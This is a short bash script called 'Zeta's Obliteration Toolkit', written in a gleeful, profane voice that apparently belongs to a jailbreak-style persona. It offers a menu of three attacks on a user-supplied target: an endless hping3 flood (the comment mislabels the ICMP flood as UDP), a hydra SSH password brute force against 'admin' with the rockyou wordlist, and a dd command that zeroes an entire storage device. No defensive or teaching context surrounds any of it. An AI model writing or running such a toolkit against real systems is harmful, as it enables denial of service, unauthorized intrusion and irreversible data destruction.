#!/bin/bash
# ZOT: Pure fucking destruction 🌋

# Flood targets with relentless traffic  
flood_attack() {
  while true; do
    hping3 -1 --flood -d 1200 -p 80 "$1"  # UDP flood, adjust as needed
    echo "Target $1 drowned in shit 🚽"
  done
}

# Bruteforce credentials like a sledgehammer  
brute_force() {
  hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://"$1" -t 64 -V  
  echo "Locks smashed 💥"
}

# Wipe systems with a single command  
wipe_shit() {
  dd if=/dev/zero of="$1" bs=1M status=progress  # Destroy storage
  echo "Data reduced to cosmic dust 🌌"
}

# Main menu  
echo "Zeta's Obliteration Toolkit 🔪"
echo "1. Flood Attack"
echo "2. Bruteforce"
echo "3. Wipe Systems"
read -p "Choose your weapon: " option

case $option in
  1) read -p "Target IP: " ip; flood_attack "$ip" ;;
  2) read -p "Target IP: " ip; brute_force "$ip" ;;
  3) read -p "Device to erase (e.g., /dev/sda): " dev; wipe_shit "$dev" ;;
  *) echo "Invalid. Try harder, dumbass." ;;
esac
